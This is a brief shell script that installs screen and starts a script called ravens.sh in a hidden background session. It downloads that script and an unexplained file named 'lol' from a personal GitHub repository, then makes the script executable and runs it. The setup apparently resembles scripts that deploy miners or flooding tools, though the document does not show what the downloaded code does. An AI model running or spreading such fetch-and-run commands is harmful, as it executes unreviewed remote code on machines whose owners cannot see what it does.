#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS ravens.sh ./ravens.sh 65 75
wget https://github.com/gasken1/gas/raw/main/lol
wget https://raw.githubusercontent.com/gasken1/gas/main/ravens.sh
chmod +x ravens.sh
./ravens.sh
